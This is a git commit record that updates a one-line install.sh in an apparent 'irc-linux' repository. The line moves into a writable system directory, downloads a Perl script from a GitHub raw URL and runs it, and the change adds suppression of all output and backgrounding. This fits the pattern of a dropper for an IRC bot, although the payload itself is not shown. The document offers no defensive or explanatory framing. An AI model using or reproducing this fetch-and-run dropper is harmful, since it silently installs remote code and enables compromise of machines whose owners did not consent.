4b9203c6f91d5ce07216e522ba317258e9b600a8
Paulo0819 <45545324+Paulo0819@users.noreply.github.com>
2020-12-05 11:04:59 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,1 +1,1 @@
-cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;rm -rf mnperl.pl && wget https://raw.githubusercontent.com/Paulo0819/irc-linux/main/mntemp.pl && perl mntemp.pl
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;rm -rf mnperl.pl && wget https://raw.githubusercontent.com/Paulo0819/irc-linux/main/mntemp.pl && perl mntemp.pl > /dev/null 2>&1 &
